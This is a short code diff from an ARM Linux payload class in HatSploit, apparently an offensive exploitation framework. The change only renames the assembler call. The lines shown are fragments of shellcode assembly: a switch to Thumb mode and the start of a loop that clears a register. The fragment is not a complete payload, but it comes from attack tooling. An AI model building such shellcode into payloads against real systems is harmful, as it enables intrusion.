@@ -25,13 +25,13 @@ class HatSploitPayload(Payload, Linux):
         })
 
     def run(self):
-        return self.assemble(
+        return self.__asm__(
             """
             start:
                 add r1, pc, #1
                 bx r1
             """
-        ) + self.assemble(
+        ) + self.__asm__(
             """
             loop:
                 eors r7, r7
